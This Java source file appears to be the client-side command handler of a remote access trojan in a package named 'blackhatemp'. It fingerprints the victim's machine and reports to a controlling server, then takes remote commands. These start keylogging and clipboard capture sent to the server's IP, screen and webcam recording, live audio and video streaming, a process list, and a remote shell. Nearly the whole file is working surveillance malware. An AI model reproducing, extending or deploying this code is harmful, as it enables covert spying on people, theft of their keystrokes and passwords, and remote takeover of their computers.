/*
 * GNU Library or Lesser Public License (LGPL)
 */
package blackhatemp;

import Configration.Configrations;
import static blackhatemp.Command.*;
import camera.StreamWebCam;
import com.github.sarxos.webcam.Webcam;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.Timer;
import javax.swing.filechooser.FileSystemView;
import threading.Clipbord;
import threading.GIFAnimation_Implimantation;
import threading.KeybordEvent;
import threading.ScreenShot_Impilmantation;
import threading.Screen_Monitor;
import threading.WebcamRecordThreading;
import threading.applications;
import threading.lifeAudio;
import threading.thrShellPower;

/**
 * @author Geoffrey
 */
public class Telnet {

    public static String ServerIP = null;
    public static final int NONE = -1;
    public static final int CLIENT = 0;
    public static final int SERVER_LISTENING = 10;
    public static final int SERVER_CONNECTED = 11;
    public static final int PIPELINE_LISTENING = 20;
    public static final int PIPELINE_CONNECTED = 21;
    protected TelnetSession telnetSession = null;
    protected Configrations TaskFile = null;
    //Threading
    protected static Thread ScreenThread = null;
    protected Screen_Monitor ScreenMonitor = null;
    protected static ScreenShot_Impilmantation ScreenShot = null;
    protected static GIFAnimation_Implimantation Screen_Record = null;
    protected static Thread LifeAudioThread = null;
    protected static StreamWebCam Webcam_Life = null;
    private static Timer WebcamRecord = null;
    private static WebcamRecordThreading RecordCamAction = null;
    private static KeybordEvent Keybord = null;
    private static Thread KeybordThread = null;
    private static Timer ClipbordTimer = null;
    private static Timer TaskMangerTimer = null;
    private static thrShellPower ShellPower = null;
    //Strings
    public static String WebcamName = null;
    private static String Password = null;
    private static String TaskFilePath = null;

    private FileSystemView fileSystemView;
    //HashMaps
    HashMap<Integer, Boolean> Tasks = new HashMap<>();

    //Camera
    public static Webcam webcam = null;

    /**
     * Creates a new instance of Telnet
     */
    public Telnet() {
        try {
            TaskFile = new Configrations();
            File Temp = File.createTempFile("tasks", "xml");
            TaskFilePath = Temp.getAbsolutePath();
            Password = TaskFile.CreateNewTaskFile(TaskFilePath);
        } catch (IOException ex) {
        }
    }

    public static String GetName() {
        return "PC-" + System.getProperty("user.name").toUpperCase();
    }

    public String Information() {
        webcam = Webcam.getDefault();
        if (webcam != null) {
            Webcam.setAutoOpenMode(true);
            WebcamName = webcam.getName();
            webcam.close();
        } else {
            WebcamName = "NWC";
            webcam.close();
        }
        Webcam.shutdown();

        String Address = this.telnetSession.MyAddress();
        String CLIENT_LOGINTIME = String.valueOf(getSystemUptime());
        String OS_Name = System.getProperty("os.name");
        String OS_Verion = System.getProperty("os.version");
        String OS_Arch = System.getProperty("os.arch");
        String OS_Lang = System.getProperty("user.language");
        String User_name = System.getProperty("user.name");
        String User_Home = System.getProperty("user.home");
        String User_Language = System.getProperty("user.language");
        String User_Country = System.getProperty("user.country");
        String JAVA_VERSION = System.getProperty("java.version");
        String CLIENT_NAME = "PC-" + User_name.toUpperCase();

        String Final = CLIENT_NAME + ":" + CLIENT_LOGINTIME + ":" + OS_Name + ":"
                + OS_Verion + ":" + OS_Arch + ":" + OS_Lang + ":" + User_name + ":"
                + User_Home + ":" + User_Language + ":" + User_Country + ":" + Address + ":" + JAVA_VERSION + ":" + WebcamName;
        return Final.trim();
    }

    public long getSystemUptime() {
        try {
            long uptime = -1;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Process uptimeProc = Runtime.getRuntime().exec("net stats srv");
                BufferedReader in = new BufferedReader(new InputStreamReader(uptimeProc.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    if (line.startsWith("Statistics since")) {
                        SimpleDateFormat format = new SimpleDateFormat("'Statistics since' MM/dd/yyyy hh:mm:ss a");
                        Date boottime = format.parse(line);
                        uptime = System.currentTimeMillis() - boottime.getTime();
                        break;
                    }
                }
            } else if (os.contains("mac") || os.contains("nix") || os.contains("nux") || os.contains("Linux") || os.contains("aix")) {
                Process uptimeProc = Runtime.getRuntime().exec("uptime");
                BufferedReader in = new BufferedReader(new InputStreamReader(uptimeProc.getInputStream()));
                String line = in.readLine();
                if (line != null) {
                    Pattern parse = Pattern.compile("((\\d+) days,)? (\\d+):(\\d+)");
                    Matcher matcher = parse.matcher(line);
                    if (matcher.find()) {
                        String _days = matcher.group(2);
                        String _hours = matcher.group(3);
                        String _minutes = matcher.group(4);
                        int days = _days != null ? Integer.parseInt(_days) : 0;
                        int hours = _hours != null ? Integer.parseInt(_hours) : 0;
                        int minutes = _minutes != null ? Integer.parseInt(_minutes) : 0;
                        uptime = (minutes * 60000) + (hours * 60000 * 60) + (days * 6000 * 60 * 24);
                    }
                }
            }
            return uptime;
        } catch (IOException | ParseException ex) {
            return 0;
        }
    }

    public void SendClose() {
        stopSession(telnetSession);
    }

    public void message(String msg) {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.out.println("Message : " + msg);
        }
    }

    public void appendData(String Command) {
        int Code = Integer.parseInt(Command);
        switch (Code) {
            case INFORMATION:
                sendString(Information(), INFORMATION);
                break;
            case UPDATE_APPLICATION:
                break;
            case UPDATE_PRAMETER:
                break;
            case RESTORY_TASKS:
                break;
            case CLOSE_SERVE_CONNECTION:
                SendClose();
                System.exit(0);
                break;
            default:
                this.Action(Code);
                break;
        }
    }

    public void createServer(int serverPort) {
        try {
            telnetSession = new TelnetServer(this, serverPort);
            if (blackhatemp.BlackHatEmp.Debug) {
                System.out.println("Start BlackHat Client....\n");
            }
            //Get Task and Reconnect if it interapted
            //Restory Tasks
        } catch (IOException exception) {
            System.err.println(exception.getMessage());
//            try {
//                telnetSession = null;
//                Thread.sleep(2000);
//                createServer(serverPort);
//            } catch (InterruptedException ex) {
//            }

        }
    }

    public void sendString(String sendString, int Command) {
        if (telnetSession != null) {
            telnetSession.sendData(Command + ":" + blackhatemp.BlackHatEmp.UUID + ":" + blackhatemp.BlackHatEmp.PASSWORD + ":" + sendString);
//            System.gc();
        }
    }

    public void sendCommand(int Command) {
        if (telnetSession != null) {
            telnetSession.sendData(Command);
        }
    }

    public boolean hasActiveSession() {
        return telnetSession != null;
    }

    public synchronized void stopSession(TelnetSession stopSession) {
        if (telnetSession != null) {
            if (stopSession == null || stopSession == telnetSession) {
                telnetSession.stopSession();
                telnetSession = null;
            }
        }
    }

    private synchronized String DaimonTasks() {
        String Ret = "";

        Tasks.put(OPERON, KEY_OPERON);
        Tasks.put(SHUTDOWN, KEY_SHUTDOWN);
        Tasks.put(RESTART, KEY_RESTART);
        Tasks.put(SCREEN_RECORD, KEY_SCREEN_RECORD);
        Tasks.put(STOP_SCREEN_RECORD, KEY_STOP_SCREEN_RECORD);
        Tasks.put(SCREEN_SHUT, KEY_SCREEN_SHUT);
        Tasks.put(STOP_SCREEN_SHUT, KEY_STOP_SCREEN_SHUT);
        Tasks.put(SCREEN_MONITOR, KEY_SCREEN_MONITOR);
        Tasks.put(STOP_SCREEN_MONITOR, KEY_STOP_SCREEN_MONITOR);
        Tasks.put(SCREEN_WEBCAM, KEY_SCREEN_WEBCAM);
        Tasks.put(SCREEN_WEBCAM_LIFE, KEY_SCREEN_WEBCAM_LIFE);
        Tasks.put(STOP_SCREEN_WEBCAM, KEY_STOP_SCREEN_WEBCAM);
        Tasks.put(STOP_SCREEN_WEBCAM_LIFE, KEY_STOP_SCREEN_WEBCAM_LIFE);
        Tasks.put(AUDIO_LIFE, KEY_AUDIO_LIFE);
        Tasks.put(STOP_AUDIO_LIFE, KEY_STOP_AUDIO_LIFE);
        Tasks.put(AUDIO_RECORD, KEY_AUDIO_RECORD);
        Tasks.put(STOP_AUDIO_RECORD, KEY_STOP_AUDIO_RECORD);
        Tasks.put(KEYBORD, KEY_KEYBORD);
        Tasks.put(STOP_KEYBORD, KEY_STOP_KEYBORD);
        Tasks.put(CLIPBORD, KEY_CLIPBORD);
        Tasks.put(STOP_CLIPBORD, KEY_STOP_CLIPBORD);
        Tasks.put(APPLICATION, KEY_APPLICATION);
        Tasks.put(STOP_APPLICATION, KEY_STOP_APPLICATION);
        Tasks.put(SHELL, KEY_SHELL);
        Tasks.put(STOP_SHELL, KEY_STOP_SHELL);
        Tasks.put(FILEMANGER, KEY_FILEMANGER);
        Tasks.put(STOP_FILEMANGER, KEY_STOP_FILEMANGER);
        Tasks.put(USB, KEY_USB);
        Tasks.put(STOP_USB, KEY_STOP_USB);
        Tasks.put(IP_SCAN, KEY_IP_SCAN);
        Tasks.put(SNIFFER, KEY_SNIFFER);
        Tasks.put(STOP_SNIFFER, KEY_STOP_SNIFFER);
        Tasks.put(FOOTPRINT, KEY_FOOTPRINT);
        Tasks.put(STOP_FOOTPRINT, KEY_STOP_FOOTPRINT);
        Tasks.put(INOFFICEORNOT, KEY_INOFFICEORNOT);
        Tasks.put(STOP_INOFFICEORNOT, KEY_STOP_INOFFICEORNOT);
        Tasks.put(PHONE, KEY_PHONE);
        Tasks.put(STOP_PHONE, KEY_STOP_PHONE);
        Tasks.put(DOWNLOAD, KEY_DOWNLOAD);
        Tasks.put(STOP_DOWNLOAD, KEY_STOP_DOWNLOAD);
        Tasks.put(ZIP_FLAG_SCREEN_SHUT, KEY_ZIP_FLAG_SCREEN_SHUT);
        Tasks.put(STOP_ZIP_FLAG_SCREEN_SHUT, KEY_STOP_ZIP_FLAG_SCREEN_SHUT);
        Tasks.put(RESEVED_FLAG_SCREEN_SHUT, KEY_RESEVED_FLAG_SCREEN_SHUT);
        Tasks.put(STOP_RESEVED_FLAG_SCREEN_SHUT, KEY_STOP_RESEVED_FLAG_SCREEN_SHUT);

        Integer[] keys = new Integer[Tasks.size()];
        Boolean[] values = new Boolean[Tasks.size()];
        int index = 0;
        for (Map.Entry<Integer, Boolean> mapEntry : Tasks.entrySet()) {
            keys[index] = mapEntry.getKey();
            values[index] = mapEntry.getValue();

            Ret += keys[index] + "=" + values[index] + ":";

            index++;
        }

        String Final = Ret.substring(0, Ret.length() - 1).trim();

        return Final;
    }

    public synchronized void Action(int ActionCommand) {
        switch (ActionCommand) {
            case TASKS:
                sendString(DaimonTasks(), TASKS);
                TaskFile.InsertDataTaskFile(TaskFilePath, Password, Tasks);
                return;
            case OPERON:
                KEY_OPERON = true;
                break;
            case SHUTDOWN:
                KEY_SHUTDOWN = true;
                break;
            case RESTART:
                KEY_RESTART = true;
                break;
            case SCREEN_RECORD:
                if (Screen_Record == null) {
                    Screen_Record = new GIFAnimation_Implimantation();
                    Screen_Record.Status(true);
                    KEY_SCREEN_RECORD = true;
                    KEY_STOP_SCREEN_RECORD = false;
                }
                break;
            case STOP_SCREEN_RECORD:
                if (Screen_Record != null) {
                    KEY_SCREEN_RECORD = false;
                    KEY_STOP_SCREEN_RECORD = true;
                    String Path = Screen_Record.Status(false);
                    sendString(Path, VIDEO_PATH);
                    Screen_Record = null;
                }
                return;
            case SCREEN_SHUT:
                if (ScreenShot == null) {
                    ScreenShot = new ScreenShot_Impilmantation();
                    ScreenShot.Status(true, 2, this);
                    KEY_SCREEN_SHUT = true;
                    KEY_STOP_SCREEN_SHUT = false;
                }
                break;
            case STOP_SCREEN_SHUT:
                if (ScreenShot != null) {
                    ScreenShot.Status(false, 0, this);
                    ScreenShot = null;
                    KEY_SCREEN_SHUT = false;
                    KEY_STOP_SCREEN_SHUT = true;
                }
                break;
            case ZIP_FLAG_SCREEN_SHUT:
                KEY_ZIP_FLAG_SCREEN_SHUT = true;
                KEY_STOP_ZIP_FLAG_SCREEN_SHUT = false;
                if (ScreenShot == null) {
                    ScreenShot = new ScreenShot_Impilmantation();
                    ScreenShot.Status(true, 2, this);
                    KEY_SCREEN_SHUT = true;
                    KEY_STOP_SCREEN_SHUT = false;
                }
                break;
            case STOP_ZIP_FLAG_SCREEN_SHUT:
                KEY_ZIP_FLAG_SCREEN_SHUT = false;
                KEY_STOP_ZIP_FLAG_SCREEN_SHUT = true;
                break;
            case RESEVED_FLAG_SCREEN_SHUT:
                KEY_RESEVED_FLAG_SCREEN_SHUT = true;
                KEY_STOP_RESEVED_FLAG_SCREEN_SHUT = false;
                if (ScreenShot == null) {
                    ScreenShot = new ScreenShot_Impilmantation();
                    ScreenShot.Status(true, 2, this);
                    KEY_SCREEN_SHUT = true;
                    KEY_STOP_SCREEN_SHUT = false;
                }
                break;
            case STOP_RESEVED_FLAG_SCREEN_SHUT:
                KEY_RESEVED_FLAG_SCREEN_SHUT = false;
                KEY_STOP_RESEVED_FLAG_SCREEN_SHUT = true;
                break;
            case SCREEN_MONITOR:
                if (ScreenThread == null) {
                    ScreenMonitor = new Screen_Monitor();
                    ScreenThread = new Thread(ScreenMonitor);
                    ScreenThread.start();
                    KEY_SCREEN_MONITOR = true;
                    KEY_STOP_SCREEN_MONITOR = false;
                }
                break;
            case STOP_SCREEN_MONITOR:
                KEY_STOP_SCREEN_MONITOR = true;
                KEY_SCREEN_MONITOR = false;
                if (ScreenThread != null) {
                    ScreenMonitor.Stop();
                    ScreenMonitor = null;
                    ScreenThread = null;
                }
                break;
            case SCREEN_WEBCAM:
                KEY_SCREEN_WEBCAM = true;
                KEY_STOP_SCREEN_WEBCAM = false;
                if (WebcamRecord == null) {
                    RecordCamAction = new WebcamRecordThreading();
                    WebcamRecord = new Timer(10, RecordCamAction);

                    WebcamRecord.start();
                }
                break;
            case STOP_SCREEN_WEBCAM:
                KEY_STOP_SCREEN_WEBCAM = true;
                KEY_SCREEN_WEBCAM = false;
                if (WebcamRecord != null) {
                    RecordCamAction.Stop();
                    WebcamRecord = null;
                }
                break;
            case SCREEN_WEBCAM_LIFE:
                KEY_SCREEN_WEBCAM_LIFE = true;
                KEY_STOP_SCREEN_WEBCAM_LIFE = false;
                if (Webcam_Life == null) {
                    Webcam_Life = new StreamWebCam();
                    Webcam_Life.setPriority(5);
                    Webcam_Life.run();
                }
                break;
            case STOP_SCREEN_WEBCAM_LIFE:
                KEY_STOP_SCREEN_WEBCAM_LIFE = true;
                KEY_SCREEN_WEBCAM_LIFE = false;
                if (Webcam_Life != null) {
                    Webcam_Life.StopCameraOnline();
                    Webcam_Life = null;
                }
                break;
            case AUDIO_LIFE:
                KEY_AUDIO_LIFE = true;
                KEY_STOP_AUDIO_LIFE = false;
                if (LifeAudioThread == null) {
                    LifeAudioThread = new Thread(new lifeAudio(true));
                    LifeAudioThread.run();
                }
                break;
            case STOP_AUDIO_LIFE:
                KEY_STOP_AUDIO_LIFE = true;
                KEY_AUDIO_LIFE = false;
                if (LifeAudioThread != null) {
                    LifeAudioThread = null;
                }
                break;
            case AUDIO_RECORD:
                KEY_AUDIO_RECORD = true;
                KEY_STOP_AUDIO_RECORD = false;
                break;
            case STOP_AUDIO_RECORD:
                KEY_STOP_AUDIO_RECORD = false;
                KEY_AUDIO_RECORD = true;
                break;
            case KEYBORD:
                KEY_KEYBORD = true;
                KEY_STOP_KEYBORD = false;
                if (KeybordThread == null) {
                    Keybord = new KeybordEvent();
                    KeybordThread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Keybord.Start(ServerIP, 25000);
                        }
                    });
                    KeybordThread.run();
                }
                break;
            case STOP_KEYBORD:
                KEY_KEYBORD = false;
                KEY_STOP_KEYBORD = true;
                if (KeybordThread != null) {
                    Keybord.Stop();
                    Keybord = null;

                    KeybordThread.stop();
                    KeybordThread = null;
                }
                break;
            case CLIPBORD:
                KEY_CLIPBORD = true;
                KEY_STOP_CLIPBORD = false;
                if (ClipbordTimer == null) {
                    ClipbordTimer = new Timer(1000, new Clipbord(ServerIP, 12000));
                    ClipbordTimer.start();
                }
                break;
            case STOP_CLIPBORD:
                KEY_CLIPBORD = false;
                KEY_STOP_CLIPBORD = true;
                if (ClipbordTimer != null) {
                    ClipbordTimer.stop();
                    ClipbordTimer = null;
                }
                break;
            case APPLICATION:
                KEY_APPLICATION = true;
                KEY_STOP_APPLICATION = false;
                if (TaskMangerTimer == null) {
                    TaskMangerTimer = new Timer(3000, new applications(ServerIP, 14000));
                    TaskMangerTimer.start();
                }
                break;
            case STOP_APPLICATION:
                KEY_APPLICATION = false;
                KEY_STOP_APPLICATION = true;
                if (TaskMangerTimer != null) {
                    TaskMangerTimer.stop();
                    TaskMangerTimer = null;
                }
                break;
            case SHELL:
                KEY_SHELL = true;
                KEY_STOP_SHELL = false;
                if (ShellPower == null) {
                    ShellPower = new thrShellPower();
                    ShellPower.run();
                }
                break;
            case STOP_SHELL:
                KEY_SHELL = false;
                KEY_STOP_SHELL = true;
                if (ShellPower != null) {
                    ShellPower.end();
                    ShellPower = null;
                }
                break;
            case FILEMANGER:
                KEY_FILEMANGER = true;
                KEY_STOP_FILEMANGER = false;

                break;
            case STOP_FILEMANGER:
                KEY_FILEMANGER = false;
                KEY_STOP_FILEMANGER = true;
                break;
            case USB:
                KEY_USB = true;
                KEY_STOP_USB = false;
                break;
            case STOP_USB:
                KEY_USB = false;
                KEY_STOP_USB = true;
                break;
            case SNIFFER:
                KEY_SNIFFER = true;
                KEY_STOP_SNIFFER = false;
                break;
            case STOP_SNIFFER:
                KEY_SNIFFER = true;
                KEY_STOP_SNIFFER = false;
                break;
            case FOOTPRINT:
                KEY_FOOTPRINT = true;
                KEY_STOP_FOOTPRINT = false;
                break;
            case STOP_FOOTPRINT:
                KEY_FOOTPRINT = false;
                KEY_STOP_FOOTPRINT = true;
                break;
            case INOFFICEORNOT:
                KEY_INOFFICEORNOT = true;
                KEY_STOP_INOFFICEORNOT = false;
                break;
            case STOP_INOFFICEORNOT:
                KEY_INOFFICEORNOT = false;
                KEY_STOP_INOFFICEORNOT = true;
                break;
            case PHONE:
                KEY_PHONE = true;
                KEY_STOP_PHONE = false;
                break;
            case STOP_PHONE:
                KEY_PHONE = false;
                KEY_STOP_PHONE = true;
                break;
            case DOWNLOAD:
                KEY_DOWNLOAD = true;
                KEY_STOP_DOWNLOAD = false;
                break;
            case STOP_DOWNLOAD:
                KEY_DOWNLOAD = false;
                KEY_STOP_DOWNLOAD = true;
                break;
        }
        sendCommand(DONE);
    }

}
